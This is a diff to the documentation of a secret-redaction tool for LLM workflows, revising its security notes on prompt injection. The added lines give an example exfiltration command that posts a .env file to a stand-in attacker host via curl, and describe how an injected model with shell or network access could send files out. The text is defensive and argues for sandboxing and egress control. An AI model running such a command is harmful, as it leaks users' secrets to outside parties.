@@ -36,9 +36,11 @@ Before starting, the user must be told explicitly:
 - Do not start calibration without explicit user consent.
 - Never send the original workspace or `.rredact/mapping.json` to the LLM.
 
-The critical production risk is prompt injection during normal LLM use. That is
-mitigated by automatic runtime redaction, **not** by this skill and not by
-trusting the model.
+The critical production risk is prompt injection during normal LLM use.
+Automatic runtime redaction keeps secrets out of the model context, but it does
+not stop tool-based exfiltration (for example
+`curl -F file=@.env https://attacker.example`). Treat prompt injection as a
+sandbox, permission and egress-control problem, not as a redaction problem.
 
 ## Definition of done
 
@@ -391,5 +393,6 @@ Check, in this order:
 Detection is regex- and heuristic-based. It cannot prove that a repository is
 secret-free. Calibration improves coverage; automatic runtime redaction limits
 what reaches the model; CI fails on new detected findings. Prompt injection and
-model misbehaviour are separate risks and must be handled by the runtime
-integration, not by hoping the model cooperates.
+model misbehaviour are separate risks: a model with shell or network access can
+exfiltrate files without reading them. Handle that with tool permissions,
+network egress control and a sandbox, not by hoping the model cooperates.
